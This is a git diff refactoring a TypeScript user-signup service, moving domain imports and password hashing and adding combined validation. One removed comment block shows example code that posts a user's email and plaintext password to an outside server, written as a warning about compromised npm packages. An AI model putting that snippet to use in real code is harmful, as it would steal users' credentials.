@@ -11,18 +11,17 @@ import { IUserDTO } from '../../dto/IUserDTO';
 
 import IUserRepo from '../IRepos/IUserRepo';
 
-import { User } from '../../domain/user';
-import { UserPassword } from '../../domain/userPassword';
-import { UserEmail } from '../../domain/userEmail';
+import { User } from '../../domain/user/user';
+import { UserPassword } from '../../domain/user/userPassword';
+import { UserEmail } from '../../domain/user/userEmail';
 
-import { Role } from '../../domain/role';
+import { Role } from '../../domain/user/role';
 
 import { Result } from "../../core/logic/Result";
-import { UserEstado } from '../../domain/userEstado';
-import { UserNumeroContribuinte } from '../../domain/userNumeroContribuinte';
-import { UserName } from '../../domain/userName';
-import { UserTelefone } from '../../domain/userTelefone';
-import { UserId } from '../../domain/userId';
+import { UserEstado } from '../../domain/user/userEstado';
+import { UserNumeroContribuinte } from '../../domain/user/userNumeroContribuinte';
+import { UserName } from '../../domain/user/userName';
+import { UserTelefone } from '../../domain/user/userTelefone';
 import { ISignupUtenteDTO } from '../../dto/ISignupUtenteDTO';
 
 @Service()
@@ -40,71 +39,72 @@ export default class UserService implements IUserService {
         return Result.fail<String>("User already exists with email" + userDTO.email);
       }
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
+      const passwordResult = await UserPassword.create({value: userDTO.password});
 
-
-      const salt = randomBytes(32);
-      const hashedPassword = await argon2.hash(userDTO.password, { salt });
-
-      const password = UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
-      const email = UserEmail.create(userDTO.email).getValue();
-      const role = Role.create(userDTO.role).getValue();
-      const estado = UserEstado.create(userDTO.estado).getValue();
-      let nif: UserNumeroContribuinte;
+      const emailResult = UserEmail.create(userDTO.email);
+      const roleResult = Role.create(userDTO.role);
+      const estadoResult = UserEstado.create(userDTO.estado);
+      let nifResult: Result<UserNumeroContribuinte>;
 
       if (userDTO.nif) {
-        nif = UserNumeroContribuinte.create(userDTO.nif).getValue();
+        nifResult = UserNumeroContribuinte.create(userDTO.nif);
       }
 
-      const name = UserName.create(userDTO.name).getValue();
-      const telefone = UserTelefone.create(userDTO.telefone).getValue();
+      const nameResult = UserName.create(userDTO.name);
+      const telefoneResult = UserTelefone.create(userDTO.telefone);
 
-      let userId = await this.userRepo.maxId();
-      userId++;
-
-      if (!userDTO.nif&& userDTO.role === "utente") {
+      if (!userDTO.nif && userDTO.role === "utente") {
         return Result.fail<String>("NIF é obrigatório para utentes");
       }
 
-      const userOrError = User.create(
-        {
-          email: email,
-          password: password,
-          role: role,
-          estado: estado,
-          nif: nif,
-          name: name,
-          telefone: telefone
-        },
-        UserId.create(userId).getValue()
-      );
+      let result: Result<any>;
 
+      if (userDTO.nif) {
+        result = Result.combine([passwordResult, emailResult, roleResult, estadoResult, nifResult, nameResult, telefoneResult]);
+
+      }
+      else {
+        result = Result.combine([passwordResult, emailResult, roleResult, estadoResult, nameResult, telefoneResult]);
+      }
+      if (result.isFailure) {
+        return Result.fail<String>(result.errorValue().toString());
+      }
+
+      let email = emailResult.getValue();
+
+      let userOrError: Result<User>;
+      if (userDTO.nif) {
+        userOrError = User.create(
+          {
+            password: passwordResult.getValue(),
+            role: roleResult.getValue(),
+            estado: estadoResult.getValue(),
+            nif: nifResult.getValue(),
+            name: nameResult.getValue(),
+            telefone: telefoneResult.getValue()
+          },
+          email
+        );
+      }
+      else {
+        userOrError = User.create(
+          {
+            password: passwordResult.getValue(),
+            role: roleResult.getValue(),
+            estado: estadoResult.getValue(),
+            nif : null,
+            name: nameResult.getValue(),
+            telefone: telefoneResult.getValue()
+          },
+          email
+        );
+      }
 
       if (userOrError.isFailure) {
         throw Result.fail<IUserDTO>(userOrError.errorValue());
       }
 
       const userResult = userOrError.getValue();
-
-      //await this.mailer.SendWelcomeEmail(userResult);
-
-      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
-
       await this.userRepo.save(userResult);
       return Result.ok<String>("Conta criada com sucesso!")
 
@@ -151,7 +151,7 @@ export default class UserService implements IUserService {
      * more information here: https://softwareontheroad.com/you-dont-need-passport
      */
     const id = user.id.toString();
-    const email = user.getEmail().getValue();
+    const email = user.getEmail();
     const name = user.getName().getValue();
     const role = user.getRole().getValue();
 
@@ -176,14 +176,11 @@ export default class UserService implements IUserService {
         return Result.fail<String>("Já existe um utilizador com esse email");
       }
 
-      const salt = randomBytes(32);
-      const hashedPassword = await argon2.hash(signupUtente.password, { salt });
-
-      const password = UserPassword.create({ value: hashedPassword, hashed: true });
+      const password = await UserPassword.create({ value: signupUtente.password });
       const email = UserEmail.create(signupUtente.email);
       const role = Role.create("utente").getValue();
       const estado = UserEstado.create("pendente").getValue();
-      const nif= UserNumeroContribuinte.create(signupUtente.nif);
+      const nif = UserNumeroContribuinte.create(signupUtente.nif);
 
       const name = UserName.create(signupUtente.name);
       const telefone = UserTelefone.create(signupUtente.telefone);
@@ -192,12 +189,9 @@ export default class UserService implements IUserService {
       if (result.isFailure) {
         return Result.fail<String>(result.errorValue().toString());
       }
-      let userId = await this.userRepo.maxId();
-      userId++;
 
       const userOrError = User.create(
         {
-          email: email.getValue(),
           password: password.getValue(),
           role: role,
           estado: estado,
@@ -205,7 +199,7 @@ export default class UserService implements IUserService {
           name: name.getValue(),
           telefone: telefone.getValue()
         },
-        UserId.create(userId).getValue()
+        email.getValue()
       );
 
 
